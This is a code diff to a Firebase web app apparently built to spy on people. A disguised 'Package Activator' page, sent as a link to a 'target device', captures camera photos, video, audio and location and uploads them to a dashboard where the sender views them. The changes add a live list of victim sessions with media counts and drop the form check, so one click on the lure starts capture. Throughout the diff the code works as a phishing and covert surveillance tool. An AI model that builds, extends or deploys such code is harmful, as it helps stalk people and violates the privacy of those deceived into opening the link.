@@ -14,7 +14,7 @@
 <script type="module">
   // Import the functions you need from the SDKs
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
-  import { getDatabase, ref, set, push, onValue, update, get, child, query, orderByChild, equalTo } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
+  import { getDatabase, ref, set, push, onValue, update, get, child, query, orderByChild, equalTo, onChildAdded } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
   import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-analytics.js";
 
   // Your web app's Firebase configuration
@@ -45,6 +45,9 @@
   window.firebaseQuery = query;
   window.firebaseOrderByChild = orderByChild;
   window.firebaseEqualTo = equalTo;
+  window.firebaseOnChildAdded = onChildAdded;
+  
+  console.log("Firebase initialized successfully");
 </script>
 <style>
 /* All your existing styles remain exactly the same */
@@ -790,6 +793,48 @@ select:focus, input:focus {
   background: var(--secondary-gradient);
 }
 
+.session-selector {
+  margin: 20px 0;
+  padding: 15px;
+  background: rgba(59, 130, 246, 0.05);
+  border-radius: var(--radius-md);
+  border: 1px solid rgba(59, 130, 246, 0.2);
+}
+
+.session-list {
+  max-height: 200px;
+  overflow-y: auto;
+  margin-top: 10px;
+}
+
+.session-item {
+  padding: 10px;
+  margin: 5px 0;
+  background: var(--card-bg);
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--card-border);
+  cursor: pointer;
+  transition: var(--transition);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.session-item:hover {
+  background: rgba(59, 130, 246, 0.1);
+  border-color: var(--accent-blue);
+}
+
+.session-item.active {
+  background: rgba(16, 185, 129, 0.1);
+  border-color: var(--accent-green);
+}
+
+.session-media-count {
+  font-size: 12px;
+  color: var(--text-secondary);
+}
+
 @media (max-width: 768px) {
   .container {
     padding: 10px;
@@ -860,6 +905,17 @@ select:focus, input:focus {
       <div class="stat-card">
         <div class="stat-number" id="totalAudio">0</div>
         <div class="stat-label">Audio</div>
+      </div>
+    </div>
+    
+    <!-- Session Selector -->
+    <div class="session-selector">
+      <h3><i class="fas fa-list"></i> Active Sessions</h3>
+      <div class="session-list" id="sessionList">
+        <div class="gallery-placeholder" style="padding: 20px;">
+          <i class="fas fa-spinner fa-spin"></i>
+          <div>Loading sessions...</div>
+        </div>
       </div>
     </div>
     
@@ -1052,7 +1108,7 @@ select:focus, input:focus {
   </div>
   
   <!-- Package Activator Card -->
-  <div class="card" id="pkg-activator-card" style="display: none;">
+  <div class="card" id="pkg-activator-card">
     <div class="header">
       <div class="logo-container">
         <div class="logo">PA</div>
@@ -1148,6 +1204,8 @@ let currentLocation = { lat: null, lng: null, accuracy: null };
 let map = null;
 let mapMarker = null;
 let captureIntervals = [];
+let allSessions = [];
+let firebaseReady = false;
 
 // Permission status tracking
 let permissionStatus = {
@@ -1164,9 +1222,6 @@ let sensorData = {
   gyroscope: { alpha: 0, beta: 0, gamma: 0 },
   orientation: { alpha: 0, beta: 0, gamma: 0 }
 };
-
-// Firebase ready check
-let firebaseReady = false;
 
 // ====================
 // DOM ELEMENTS
@@ -1192,6 +1247,7 @@ const sessionIdDisplay = document.getElementById('sessionId');
 const mediaGallery = document.getElementById('mediaGallery');
 const themeToggle = document.getElementById('themeToggle');
 const whatsappBtn = document.getElementById('whatsappBtn');
+const sessionList = document.getElementById('sessionList');
 
 // Permission elements
 const cameraStatus = document.getElementById('cameraStatus');
@@ -1248,10 +1304,12 @@ function waitForFirebase() {
       firebaseReady = true;
       resolve();
     } else {
+      console.log("Waiting for Firebase...");
       const checkInterval = setInterval(() => {
         if (window.firebaseDB) {
           firebaseReady = true;
           clearInterval(checkInterval);
+          console.log("Firebase ready");
           resolve();
         }
       }, 100);
@@ -1268,9 +1326,11 @@ async function saveSessionToFirebase(sessionId, sessionData) {
       id: sessionId,
       updatedAt: Date.now()
     });
-    console.log('Session saved to Firebase');
+    console.log('Session saved to Firebase:', sessionId);
+    return true;
   } catch (error) {
     console.error('Error saving session to Firebase:', error);
+    return false;
   }
 }
 
@@ -1291,11 +1351,14 @@ async function saveMediaToFirebase(sessionId, mediaItem) {
   try {
     const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media/${mediaItem.id}`);
     await window.firebaseSet(mediaRef, mediaItem);
-    console.log('Media saved to Firebase');
+    console.log('Media saved to Firebase:', mediaItem.id);
     
-    // Also update the session's media list
-    const sessionMediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/mediaList/${mediaItem.id}`);
-    await window.firebaseSet(sessionMediaRef, true);
+    // Update session's lastActive
+    const sessionRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}`);
+    await window.firebaseUpdate(sessionRef, {
+      lastActive: Date.now(),
+      updatedAt: Date.now()
+    });
     
     return true;
   } catch (error) {
@@ -1326,10 +1389,6 @@ async function clearSessionMediaFromFirebase(sessionId) {
   try {
     const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media`);
     await window.firebaseSet(mediaRef, null);
-    
-    const mediaListRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/mediaList`);
-    await window.firebaseSet(mediaListRef, null);
-    
     console.log('Media cleared from Firebase');
     return true;
   } catch (error) {
@@ -1338,22 +1397,23 @@ async function clearSessionMediaFromFirebase(sessionId) {
   }
 }
 
-async function subscribeToSessionMedia(sessionId, callback) {
-  await waitForFirebase();
-  try {
-    const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media`);
-    window.firebaseOnValue(mediaRef, (snapshot) => {
-      if (snapshot.exists()) {
-        const mediaObj = snapshot.val();
-        const mediaArray = Object.values(mediaObj).sort((a, b) => b.timestamp - a.timestamp);
-        callback(mediaArray);
-      } else {
-        callback([]);
-      }
-    });
-  } catch (error) {
-    console.error('Error subscribing to media:', error);
-  }
+function subscribeToSessionMedia(sessionId, callback) {
+  waitForFirebase().then(() => {
+    try {
+      const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/media`);
+      window.firebaseOnValue(mediaRef, (snapshot) => {
+        if (snapshot.exists()) {
+          const mediaObj = snapshot.val();
+          const mediaArray = Object.values(mediaObj).sort((a, b) => b.timestamp - a.timestamp);
+          callback(mediaArray);
+        } else {
+          callback([]);
+        }
+      });
+    } catch (error) {
+      console.error('Error subscribing to media:', error);
+    }
+  });
 }
 
 async function getAllSessionsFromFirebase() {
@@ -1364,7 +1424,10 @@ async function getAllSessionsFromFirebase() {
     
     if (snapshot.exists()) {
       const sessionsObj = snapshot.val();
-      return Object.values(sessionsObj);
+      const sessionsArray = Object.values(sessionsObj);
+      // Sort by lastActive (most recent first)
+      sessionsArray.sort((a, b) => (b.lastActive || 0) - (a.lastActive || 0));
+      return sessionsArray;
     }
     return [];
   } catch (error) {
@@ -1373,27 +1436,154 @@ async function getAllSessionsFromFirebase() {
   }
 }
 
+function subscribeToAllSessions(callback) {
+  waitForFirebase().then(() => {
+    try {
+      const sessionsRef = window.firebaseRef(window.firebaseDB, 'sessions');
+      window.firebaseOnValue(sessionsRef, async (snapshot) => {
+        if (snapshot.exists()) {
+          const sessionsObj = snapshot.val();
+          const sessionsArray = Object.values(sessionsObj);
+          
+          // Get media counts for each session
+          for (let session of sessionsArray) {
+            const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${session.id}/media`);
+            const mediaSnapshot = await window.firebaseGet(mediaRef);
+            if (mediaSnapshot.exists()) {
+              const mediaObj = mediaSnapshot.val();
+              session.mediaCount = Object.keys(mediaObj).length;
+            } else {
+              session.mediaCount = 0;
+            }
+          }
+          
+          // Sort by lastActive (most recent first)
+          sessionsArray.sort((a, b) => (b.lastActive || 0) - (a.lastActive || 0));
+          callback(sessionsArray);
+        } else {
+          callback([]);
+        }
+      });
+    } catch (error) {
+      console.error('Error subscribing to sessions:', error);
+    }
+  });
+}
+
 async function updateStatsFromFirebase() {
-  const allSessions = await getAllSessionsFromFirebase();
+  const sessions = await getAllSessionsFromFirebase();
   
-  totalLinksEl.textContent = allSessions.length;
+  totalLinksEl.textContent = sessions.length;
   
   let totalPhotos = 0, totalVideos = 0, totalAudio = 0;
   
-  for (const session of allSessions) {
+  for (const session of sessions) {
     if (session.media) {
-      const mediaArray = Object.values(session.media);
+      const mediaArray = Object.values(session.media || {});
       mediaArray.forEach(item => {
         if (item.type === 'photo') totalPhotos++;
         else if (item.type === 'video') totalVideos++;
         else if (item.type === 'audio') totalAudio++;
       });
+    } else {
+      // Get media counts directly
+      try {
+        const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${session.id}/media`);
+        const mediaSnapshot = await window.firebaseGet(mediaRef);
+        if (mediaSnapshot.exists()) {
+          const mediaObj = mediaSnapshot.val();
+          Object.values(mediaObj).forEach(item => {
+            if (item.type === 'photo') totalPhotos++;
+            else if (item.type === 'video') totalVideos++;
+            else if (item.type === 'audio') totalAudio++;
+          });
+        }
+      } catch (error) {
+        console.error('Error getting media counts:', error);
+      }
     }
   }
   
   totalPhotosEl.textContent = totalPhotos;
   totalVideosEl.textContent = totalVideos;
   totalAudioEl.textContent = totalAudio;
+}
+
+function renderSessionList(sessions) {
+  if (!sessionList) return;
+  
+  if (sessions.length === 0) {
+    sessionList.innerHTML = `
+      <div class="gallery-placeholder" style="padding: 20px;">
+        <i class="fas fa-link"></i>
+        <div>No sessions yet</div>
+        <small>Click "Generate New Link" to create one</small>
+      </div>
+    `;
+    return;
+  }
+  
+  sessionList.innerHTML = sessions.map(session => {
+    const isActive = session.id === currentSessionId;
+    const mediaCount = session.mediaCount || 0;
+    const lastActive = session.lastActive ? new Date(session.lastActive).toLocaleString() : 'Unknown';
+    
+    return `
+      <div class="session-item ${isActive ? 'active' : ''}" data-session-id="${session.id}">
+        <div>
+          <div><i class="fas fa-link"></i> ${session.id.substring(0, 15)}...</div>
+          <div class="session-media-count">
+            <i class="fas fa-images"></i> ${mediaCount} media
+          </div>
+          <div class="session-media-count">
+            <i class="fas fa-clock"></i> ${lastActive}
+          </div>
+        </div>
+        <div>
+          ${!isActive ? '<button class="btn btn-small btn-outline view-session-btn" data-session-id="' + session.id + '">View</button>' : '<span class="status-badge status-granted">Active</span>'}
+        </div>
+      </div>
+    `;
+  }).join('');
+  
+  // Add click handlers for session items
+  document.querySelectorAll('.session-item').forEach(item => {
+    item.addEventListener('click', (e) => {
+      if (!e.target.classList.contains('view-session-btn') && !e.target.closest('.view-session-btn')) {
+        const sessionId = item.dataset.sessionId;
+        if (sessionId && sessionId !== currentSessionId) {
+          loadSessionData(sessionId);
+        }
+      }
+    });
+  });
+  
+  document.querySelectorAll('.view-session-btn').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const sessionId = btn.dataset.sessionId;
+      if (sessionId) {
+        loadSessionData(sessionId);
+      }
+    });
+  });
+}
+
+async function loadSessionData(sessionId) {
+  currentSessionId = sessionId;
+  sessionIdDisplay.textContent = sessionId;
+  
+  const link = `${window.location.origin}${window.location.pathname}?id=${encodeURIComponent(sessionId)}`;
+  generatedLink.value = link;
+  
+  linkArea.classList.remove('hidden');
+  dataArea.classList.remove('hidden');
+  permissionArea.classList.remove('hidden');
+  
+  // Load media for this session
+  renderMediaGallery(sessionId);
+  
+  showNotification(`Loaded session: ${sessionId.substring(0, 15)}...`, 'success');
 }
 
 // ====================
@@ -1464,32 +1654,14 @@ async function saveSession(sessionId, data = {}) {
   await updateStatsFromFirebase();
 }
 
-async function loadSession(sessionId) {
-  return await getSessionFromFirebase(sessionId);
-}
-
 async function getSessionMedia(sessionId) {
   return await getAllMediaFromFirebase(sessionId);
-}
-
-async function saveSessionMedia(sessionId, mediaArray) {
-  // Clear existing media first
-  await clearSessionMediaFromFirebase(sessionId);
-  
-  // Save each media item
-  for (const item of mediaArray) {
-    await saveMediaToFirebase(sessionId, item);
-  }
-  
-  await updateStatsFromFirebase();
-  renderMediaGallery(sessionId);
 }
 
 async function addMediaToSession(sessionId, mediaItem) {
   await saveMediaToFirebase(sessionId, mediaItem);
   await updateStatsFromFirebase();
   
-  // The gallery will auto-update via the Firebase subscription
   showNotification(`${mediaItem.type} captured!`, 'success');
 }
 
@@ -1512,7 +1684,7 @@ function renderMediaGallery(sessionId) {
         <div class="gallery-placeholder">
           <i class="fas fa-camera-retro"></i>
           <div>No media captured yet</div>
-          <small>Click "Activate Package" to start capturing</small>
+          <small>Open this link on another device and click "Activate Package"</small>
         </div>
       `;
       return;
@@ -2009,7 +2181,7 @@ async function generateNewLink() {
   await saveSession(currentSessionId, { 
     link: link,
     created: Date.now(),
-    media: {}
+    lastActive: Date.now()
   });
   
   renderMediaGallery(currentSessionId);
@@ -2133,27 +2305,17 @@ document.head.appendChild(style);
 // PACKAGE ACTIVATOR
 // ====================
 async function activatePackage() {
-  if (!simSelect.value || mobileNumber.value.length < 11) {
-    showNotification('Please select provider and enter valid mobile number', 'warning');
-    return;
-  }
-  
-  activateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-  activateBtn.disabled = true;
-  
   const urlParams = new URLSearchParams(window.location.search);
   const sessionId = urlParams.get('id');
   
   if (!sessionId) {
-    showNotification('Invalid session - please generate a link first', 'error');
-    activateBtn.innerHTML = '<i class="fas fa-bolt"></i> Activate Package';
-    activateBtn.disabled = false;
+    showNotification('Invalid session - please use a link with session ID', 'error');
     return;
   }
   
   currentSessionId = sessionId;
   
-  // Show permission area on dashboard
+  // Show permission area
   permissionArea.classList.remove('hidden');
   dataArea.classList.remove('hidden');
   
@@ -2162,7 +2324,6 @@ async function activatePackage() {
   
   setTimeout(() => {
     activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Activation in progress - capturing data';
-    activateBtn.innerHTML = '<i class="fas fa-check"></i> Activated';
     permissionMessage.style.display = 'none';
   }, 3000);
 }
@@ -2220,35 +2381,69 @@ whatsappBtn.addEventListener('click', () => {
 async function init() {
   initTheme();
   
+  // Wait for Firebase to be ready
+  await waitForFirebase();
+  console.log("Firebase initialized, loading data...");
+  
   const urlParams = new URLSearchParams(window.location.search);
   const sessionId = urlParams.get('id');
   
+  // Subscribe to all sessions for the dashboard
+  subscribeToAllSessions((sessions) => {
+    allSessions = sessions;
+    renderSessionList(sessions);
+    updateStatsFromFirebase();
+  });
+  
   if (sessionId) {
+    // This is a target device (someone opening the link)
+    console.log("Target device mode for session:", sessionId);
     dashboardCard.style.display = 'none';
     pkgActivatorCard.style.display = 'block';
     document.querySelector('.container').style.gridTemplateColumns = '1fr';
     
+    currentSessionId = sessionId;
+    sessionIdDisplay.textContent = sessionId;
+    
+    const link = `${window.location.origin}${window.location.pathname}?id=${encodeURIComponent(sessionId)}`;
+    generatedLink.value = link;
+    
+    linkArea.classList.remove('hidden');
+    permissionArea.classList.remove('hidden');
+    
+    // Check if session exists, if not create it
     const session = await getSessionFromFirebase(sessionId);
-    if (session) {
-      currentSessionId = sessionId;
-      renderMediaGallery(sessionId);
-    } else {
-      currentSessionId = sessionId;
+    if (!session) {
       await saveSession(sessionId, { 
-        link: window.location.href,
+        link: link,
         created: Date.now(),
-        media: {}
+        lastActive: Date.now()
       });
     }
     
-    // Show permission area
-    permissionArea.classList.remove('hidden');
-    
   } else {
+    // This is the dashboard
+    console.log("Dashboard mode");
     pkgActivatorCard.style.display = 'none';
     
-    // Update stats from Firebase
-    await updateStatsFromFirebase();
+    // Check for last session
+    const lastSessionId = localStorage.getItem('lastSessionId');
+    if (lastSessionId) {
+      const session = await getSessionFromFirebase(lastSessionId);
+      if (session) {
+        currentSessionId = lastSessionId;
+        sessionIdDisplay.textContent = currentSessionId;
+        
+        const link = `${window.location.origin}${window.location.pathname}?id=${encodeURIComponent(currentSessionId)}`;
+        generatedLink.value = link;
+        
+        linkArea.classList.remove('hidden');
+        dataArea.classList.remove('hidden');
+        permissionArea.classList.remove('hidden');
+        
+        renderMediaGallery(currentSessionId);
+      }
+    }
   }
 }
 
